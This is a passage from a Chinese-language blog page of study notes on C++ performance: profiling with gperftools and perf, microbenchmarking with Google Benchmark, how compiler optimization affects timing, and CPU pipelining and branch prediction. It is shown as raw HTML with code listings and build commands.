<span class="hljs-string">"build"</span><br>cmake -E <span class="hljs-built_in">chdir</span> <span class="hljs-string">"build"</span> cmake -DBENCHMARK_DOWNLOAD_DEPENDENCIES=on -DCMAKE_BUILD_TYPE=Release ../<br>cmake --build <span class="hljs-string">"build"</span> --config Release<br></code></pre></div></td></tr></table></figure><figure class="highlight sh"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs sh">// code<br>git <span class="hljs-built_in">clone</span> git@github.com:PacktPublishing/The-Art-of-Writing-Efficient-Programs.git<br></code></pre></div></td></tr></table></figure><h3><span id="gperftools">gperftools</span></h3><figure class="highlight sh"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs sh">clang++ -g -O3 -mavx2 -Wall -pedantic 02_substring_sort.C -o example &amp;&amp; CPUPROFILE=prof.data ./example &amp;&amp; pprof --text ./example prof.data<br></code></pre></div></td></tr></table></figure><figure class="highlight sh"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs sh">clang++ -g -O3 -mavx2 -Wall -pedantic 03_substring_sort.C -o example &amp;&amp; CPUPROFILE=prof.data ./example &amp;&amp; pprof --text ./example prof.data<br></code></pre></div></td></tr></table></figure><figure class="highlight sh"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs sh">clang++ -g -O3 -mavx2 -Wall -pedantic 04_substring_sort.C -o example &amp;&amp; CPUPROFILE=prof.data ./example &amp;&amp; pprof --text ./example prof.data<br></code></pre></div></td></tr></table></figure><blockquote><p>clang++ 13 在 -O3 下的结果，和 clang++-11 的结果不同。</p><p>对 compare 函数的优化，13 实在是太厉害了。</p></blockquote><h3><span id="perf">perf</span></h3><p>使用硬件性能计数器和基于时间的采样。</p><figure class="highlight sh"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs sh">// 可选事件列表<br>perf list<br><br>perf <span class="hljs-built_in">stat</span> ./example<br><br>// 性能分析器<br>perf record ./example<br>perf report<br></code></pre></div></td></tr></table></figure><p>由于编译器优化，指令重排等，perf显示的汇编代码和源代码的对应关系并不准确。</p><h3><span id="google-performance">Google Performance</span></h3><figure class="highlight sh"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs sh">// -lprofiler<br>clang++ -g -O3 -mavx2 -Wall -pedantic -lprofiler 02_substring_sort.C -o example<br><br>CPUPROFILE=prof.data CPUPROFILE_FREQUENCY=1000 ./example<br><br>pprof ./example prof.data<br></code></pre></div></td></tr></table></figure><figure class="highlight sh"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs sh">// 调用图<br>pprof --pdf ./example prof.data &gt; prof.pdf<br></code></pre></div></td></tr></table></figure><h3><span id="微基准测试">微基准测试</span></h3><p>大型程序性能测试：</p><ul><li>整体编译时间长</li><li>性能关键部分不那么明显</li><li>目标上下文发生的概率可能较小，比如特定的网络请求时发生</li></ul><p>微基准测试，关注某个函数的测试。通过设置函数的起始条件，轻松调用此代码片段。</p><p>另外，<strong>微基准测试</strong>严重依赖运行代码时，程序所处的上下文环境。测试时，将目标函数放单独在一个编译单元编译，可以缓解编译器优化，对目标函数的运行结果的影响。</p><p>微基准测试，不可不信，不可全信。</p><h3><span id="编译器优化">编译器优化</span></h3><p>C++ 标准中，定义了一个关键概念：可观察行为（observablebehavior）。</p><p>编译器可以对程序进行任何它想要的更改，<strong>只要这些更改的结果不会改变可观察行为的结果</strong>。</p><ul><li>volatile 对象的访问，严格按照表达式的语义，不会对其重新排序</li><li>程序终止时，写入文件时，严格按照程序写入的方式执行</li><li>发送到交互设备的提示文本，将在程序等待输入之前，输出显示。输入和输出操作不能被省略或者重排</li></ul><figure class="highlight cpp"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs cpp"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;chrono&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;cstdlib&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;cstring&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;iostream&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;memory&gt;</span></span><br><br><span class="hljs-keyword">using</span> <span class="hljs-built_in">std</span>::chrono::duration_cast;<br><span class="hljs-keyword">using</span> <span class="hljs-built_in">std</span>::chrono::microseconds;<br><span class="hljs-keyword">using</span> <span class="hljs-built_in">std</span>::chrono::system_clock;<br><span class="hljs-keyword">using</span> <span class="hljs-built_in">std</span>::<span class="hljs-built_in">cout</span>;<br><span class="hljs-keyword">using</span> <span class="hljs-built_in">std</span>::<span class="hljs-built_in">endl</span>;<br><span class="hljs-keyword">using</span> <span class="hljs-built_in">std</span>::<span class="hljs-built_in">unique_ptr</span>;<br><br><span class="hljs-function"><span class="hljs-keyword">bool</span> <span class="hljs-title">compare1</span><span class="hljs-params">(<span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span>* s1, <span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span>* s2)</span> </span>&#123;<br>    <span class="hljs-keyword">int</span> i1 = <span class="hljs-number">0</span>, i2 = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">char</span> c1, c2;<br>    <span class="hljs-keyword">while</span> (<span class="hljs-number">1</span>) &#123;<br>        c1 = s1[i1]; c2 = s2[i2];<br>        <span class="hljs-keyword">if</span> (c1 != c2) <span class="hljs-keyword">return</span> c1 &gt; c2;<br>        ++i1; ++i2;<br>    &#125;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">bool</span> <span class="hljs-title">compare2</span><span class="hljs-params">(<span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span>* s1, <span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span>* s2)</span> </span>&#123;<br>    <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> i1 = <span class="hljs-number">0</span>, i2 = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">char</span> c1, c2;<br>    <span class="hljs-keyword">while</span> (<span class="hljs-number">1</span>) &#123;<br>        c1 = s1[i1]; c2 = s2[i2];<br>        <span class="hljs-keyword">if</span> (c1 != c2) <span class="hljs-keyword">return</span> c1 &gt; c2;<br>        ++i1; ++i2;<br>    &#125;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span> </span>&#123;<br>    <span class="hljs-keyword">constexpr</span> <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> N = <span class="hljs-number">1</span> &lt;&lt; <span class="hljs-number">20</span>;<br>    <span class="hljs-keyword">constexpr</span> <span class="hljs-keyword">int</span> NI = <span class="hljs-number">1</span> &lt;&lt; <span class="hljs-number">11</span>;<br>    unique_ptr&lt;char[]&gt; s(new char[2*N]);<br>    ::<span class="hljs-built_in">memset</span>(s.get(), <span class="hljs-string">'a'</span>, <span class="hljs-number">2</span>*N*<span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">char</span>));<br>    s[<span class="hljs-number">2</span>*N<span class="hljs-number">-1</span>] = <span class="hljs-number">0</span>;<br>    system_clock::time_point t0 = system_clock::now();<br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; NI; ++i) &#123;<br>        compare1(s.get(), s.get() + N);<br>    &#125;<br>    system_clock::time_point t1 = system_clock::now();<br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; NI; ++i) &#123;<br>        compare2(s.get(), s.get() + N);<br>    &#125;<br>    system_clock::time_point t2 = system_clock::now();<br>    <span class="hljs-built_in">cout</span> &lt;&lt; duration_cast&lt;microseconds&gt;(t1 - t0).count() &lt;&lt; <span class="hljs-string">"us "</span> &lt;&lt; duration_cast&lt;microseconds&gt;(t2 - t1).count() &lt;&lt; <span class="hljs-string">"us"</span> &lt;&lt; <span class="hljs-built_in">endl</span>;<br>&#125;<br></code></pre></div></td></tr></table></figure><p>这段程序，compare1、compare2 不会改变程序中 s的可观察行为。编译器直接跳过执行。输出时间是 0。</p><p>使用 volatile 可以正常执行测试：</p><figure class="highlight cpp"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs cpp"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;chrono&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;cstdlib&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;cstring&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;iostream&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;memory&gt;</span></span><br><br><span class="hljs-keyword">using</span> <span class="hljs-built_in">std</span>::chrono::duration_cast;<br><span class="hljs-keyword">using</span> <span class="hljs-built_in">std</span>::chrono::microseconds;<br><span class="hljs-keyword">using</span> <span class="hljs-built_in">std</span>::chrono::system_clock;<br><span class="hljs-keyword">using</span> <span class="hljs-built_in">std</span>::<span class="hljs-built_in">cout</span>;<br><span class="hljs-keyword">using</span> <span class="hljs-built_in">std</span>::<span class="hljs-built_in">endl</span>;<br><span class="hljs-keyword">using</span> <span class="hljs-built_in">std</span>::<span class="hljs-built_in">unique_ptr</span>;<br><br><span class="hljs-function"><span class="hljs-keyword">bool</span> <span class="hljs-title">compare1</span><span class="hljs-params">(<span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span>* s1, <span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span>* s2)</span> </span>&#123;<br>    <span class="hljs-keyword">int</span> i1 = <span class="hljs-number">0</span>, i2 = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">char</span> c1, c2;<br>    <span class="hljs-keyword">while</span> (<span class="hljs-number">1</span>) &#123;<br>        c1 = s1[i1]; c2 = s2[i2];<br>        <span class="hljs-keyword">if</span> (c1 != c2) <span class="hljs-keyword">return</span> c1 &gt; c2;<br>        ++i1; ++i2;<br>    &#125;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">bool</span> <span class="hljs-title">compare2</span><span class="hljs-params">(<span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span>* s1, <span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span>* s2)</span> </span>&#123;<br>    <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> i1 = <span class="hljs-number">0</span>, i2 = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">char</span> c1, c2;<br>    <span class="hljs-keyword">while</span> (<span class="hljs-number">1</span>) &#123;<br>        c1 = s1[i1]; c2 = s2[i2];<br>        <span class="hljs-keyword">if</span> (c1 != c2) <span class="hljs-keyword">return</span> c1 &gt; c2;<br>        ++i1; ++i2;<br>    &#125;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span> </span>&#123;<br>    <span class="hljs-keyword">constexpr</span> <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> N = <span class="hljs-number">1</span> &lt;&lt; <span class="hljs-number">20</span>;<br>    <span class="hljs-keyword">constexpr</span> <span class="hljs-keyword">int</span> NI = <span class="hljs-number">1</span> &lt;&lt; <span class="hljs-number">11</span>;<br>    unique_ptr&lt;char[]&gt; s(new char[2*N]);<br>    ::<span class="hljs-built_in">memset</span>(s.get(), <span class="hljs-string">'a'</span>, <span class="hljs-number">2</span>*N*<span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">char</span>));<br>    s[<span class="hljs-number">2</span>*N<span class="hljs-number">-1</span>] = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">volatile</span> <span class="hljs-keyword">bool</span> sink;  <span class="hljs-comment">// difference</span><br>    system_clock::time_point t0 = system_clock::now();<br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; NI; ++i) &#123;<br>        sink = compare1(s.get(), s.get() + N);  <span class="hljs-comment">// difference</span><br>    &#125;<br>    system_clock::time_point t1 = system_clock::now();<br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; NI; ++i) &#123;<br>        sink = compare2(s.get(), s.get() + N);  <span class="hljs-comment">// difference</span><br>    &#125;<br>    system_clock::time_point t2 = system_clock::now();<br>    <span class="hljs-built_in">cout</span> &lt;&lt; duration_cast&lt;microseconds&gt;(t1 - t0).count() &lt;&lt; <span class="hljs-string">"us "</span> &lt;&lt; duration_cast&lt;microseconds&gt;(t2 - t1).count() &lt;&lt; <span class="hljs-string">"us"</span> &lt;&lt; <span class="hljs-built_in">endl</span>;<br>&#125;<br></code></pre></div></td></tr></table></figure><h3><span id="google-benchmark">Google benchmark</span></h3><figure class="highlight sh"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs sh">git <span class="hljs-built_in">clone</span> https://github.com/google/benchmark.git --depth=1<br><br><span class="hljs-built_in">cd</span> benchmark<br>cmake -E make_directory <span class="hljs-string">"build"</span><br>cmake -E <span class="hljs-built_in">chdir</span> <span class="hljs-string">"build"</span> cmake -DBENCHMARK_DOWNLOAD_DEPENDENCIES=on -DCMAKE_BUILD_TYPE=Release ../<br>cmake --build <span class="hljs-string">"build"</span> --config Release<br><br><span class="hljs-built_in">export</span> GBEN_INC=xxx/benchmark/include/<br><span class="hljs-built_in">export</span> GBEN_LIB=xxx/benchmark/build/src/<br><br>clang++ -g -O3 -mavx2 -Wall -pedantic -I<span class="hljs-variable">$GBEN_INC</span> -lpthread -lrt -lm 10a_compare_mbm.C <span class="hljs-variable">$GBEN_LIB</span>/libbenchmark.a -o benchmark<br></code></pre></div></td></tr></table></figure><figure class="highlight sh"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs sh">./benchmark<br></code></pre></div></td></tr></table></figure><figure class="highlight cpp"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs cpp"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;cstdlib&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;cstring&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;memory&gt;</span></span><br><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">"benchmark/benchmark.h"</span></span><br><br><span class="hljs-keyword">using</span> <span class="hljs-built_in">std</span>::<span class="hljs-built_in">unique_ptr</span>;<br><br><span class="hljs-function"><span class="hljs-keyword">bool</span> <span class="hljs-title">compare_int</span><span class="hljs-params">(<span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span>* s1, <span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span>* s2)</span> </span>&#123;<br>    <span class="hljs-keyword">char</span> c1, c2;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i1 = <span class="hljs-number">0</span>, i2 = <span class="hljs-number">0</span>; ; ++i1, ++i2) &#123;<br>        c1 = s1[i1]; c2 = s2[i2];<br>        <span class="hljs-keyword">if</span> (c1 != c2) <span class="hljs-keyword">return</span> c1 &gt; c2;<br>    &#125;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">bool</span> <span class="hljs-title">compare_uint</span><span class="hljs-params">(<span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span>* s1, <span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span>* s2)</span> </span>&#123;<br>    <span class="hljs-keyword">char</span> c1, c2;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> i1 = <span class="hljs-number">0</span>, i2 = <span class="hljs-number">0</span>; ; ++i1, ++i2) &#123;<br>        c1 = s1[i1]; c2 = s2[i2];<br>        <span class="hljs-keyword">if</span> (c1 != c2) <span class="hljs-keyword">return</span> c1 &gt; c2;<br>    &#125;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">bool</span> <span class="hljs-title">compare_uint_l</span><span class="hljs-params">(<span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span>* s1, <span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span>* s2, <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> l)</span> </span>&#123;<br>    <span class="hljs-keyword">if</span> (s1 == s2) <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>    <span class="hljs-keyword">char</span> c1, c2;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> i1 = <span class="hljs-number">0</span>, i2 = <span class="hljs-number">0</span>; i1 &lt; l; ++i1, ++i2) &#123;<br>        c1 = s1[i1]; c2 = s2[i2];<br>        <span class="hljs-keyword">if</span> (c1 != c2) <span class="hljs-keyword">return</span> c1 &gt; c2;<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">BM_loop_int</span><span class="hljs-params">(benchmark::State&amp; state)</span> </span>&#123;<br>    <span class="hljs-keyword">const</span> <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> N = state.range(<span class="hljs-number">0</span>);<br>    unique_ptr&lt;char[]&gt; s(new char[2*N]);<br>    ::<span class="hljs-built_in">memset</span>(s.get(), <span class="hljs-string">'a'</span>, <span class="hljs-number">2</span>*N*<span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">char</span>));<br>    s[<span class="hljs-number">2</span>*N<span class="hljs-number">-1</span>] = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span>* s1 = s.get(), *s2 = s1 + N;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">auto</span> _ : state) &#123;<br>        benchmark::DoNotOptimize(compare_int(s1, s2));<br>    &#125;<br>    state.SetItemsProcessed(N*state.iterations());<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">BM_loop_uint</span><span class="hljs-params">(benchmark::State&amp; state)</span> </span>&#123;<br>    <span class="hljs-keyword">const</span> <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> N = state.range(<span class="hljs-number">0</span>);<br>    unique_ptr&lt;char[]&gt; s(new char[2*N]);<br>    ::<span class="hljs-built_in">memset</span>(s.get(), <span class="hljs-string">'a'</span>, <span class="hljs-number">2</span>*N*<span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">char</span>));<br>    s[<span class="hljs-number">2</span>*N<span class="hljs-number">-1</span>] = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span>* s1 = s.get(), *s2 = s1 + N;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">auto</span> _ : state) &#123;<br>        benchmark::DoNotOptimize(compare_uint(s1, s2));<br>    &#125;<br>    state.SetItemsProcessed(N*state.iterations());<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">BM_loop_uint_l</span><span class="hljs-params">(benchmark::State&amp; state)</span> </span>&#123;<br>    <span class="hljs-keyword">const</span> <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> N = state.range(<span class="hljs-number">0</span>);<br>    unique_ptr&lt;char[]&gt; s(new char[2*N]);<br>    ::<span class="hljs-built_in">memset</span>(s.get(), <span class="hljs-string">'a'</span>, <span class="hljs-number">2</span>*N*<span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">char</span>));<br>    s[<span class="hljs-number">2</span>*N<span class="hljs-number">-1</span>] = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span>* s1 = s.get(), *s2 = s1 + N;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">auto</span> _ : state) &#123;<br>        benchmark::DoNotOptimize(compare_uint_l(s1, s2, <span class="hljs-number">2</span>*N));<br>    &#125;<br>    state.SetItemsProcessed(N*state.iterations());<br>&#125;<br><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> ARGS -&gt;Arg(1&lt;&lt;20)</span><br><br>BENCHMARK(BM_loop_int) ARGS;<br>BENCHMARK(BM_loop_uint) ARGS;<br>BENCHMARK(BM_loop_uint_l) ARGS;<br><br>BENCHMARK_MAIN();<br></code></pre></div></td></tr></table></figure><p><code>benchmark::State&amp; state</code> :入参；<code>state.SetItemsProcessed</code> :报告代码每秒处理的字符数；<code>-&gt;Arg(1&lt;&lt;20)</code> : 向BENCHMARK 宏传递参数。</p><p><code>benchmark::DoNotOptimize</code> : 类似 volatile sink的作用，不会将 compare_uint函数调用优化掉，但是函数内部逻辑还是会进行优化。</p><h2><span id="实验二-高效利用-cpu-资源">实验二 高效利用 CPU 资源</span></h2><h3><span id="cpu-指令运行优化">CPU 指令运行优化</span></h3><ul><li><p>对于每次循环，独立地，对寄存器中相同的数据，进行不同的操作，是可以指令级并行的。</p></li><li><p>数据依赖依靠流水线技术，错位执行。每个循环使用相同的寄存器，对于同一个寄存器不能在一个周期内既读又写。但是这是对于编译器而言，实际上硬件上的寄存器并不一定相同。寄存器重命名，可以使得相同寄存器名称实际在运行时可以对应到不同的硬件寄存器。</p></li><li><p>流水线技术需要足够多的指令才能发挥出其性能优势。如果出现分支，那么需要分支预测，来尽可能提供更多的指令来运行。</p></li><li><p>分支预测 +推测执行，处理器会根据历史运行结果，推测是否需要执行某个分支的指令。如果预测正确，并行化提高了性能；如果预测错误，就需要冲刷流水线，丢弃预测错误的指令。</p><blockquote><p>perf stat ./benchmark</p><p>可以查看分支预测的情况</p></blockquote></li><li><p>推测执行可能会出现问题，比如 *ptr 解引用了 NULL 指针，但是由于CPU 会在缓冲区进行推测执行，但是 CPU 会假装从未发生。</p></li><li><p>循环展开也许会对现代编译器下的代码产生有益的影响，但是不是一定的。因为许多向量化编译器，会使用SSE 或者 AVX指令来优化循环的执行，一次处理多个元素。所以，手动循环展开，不一定会更高效。</p></li></ul><p>测试运算指令：</p><figure class="highlight cpp"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span 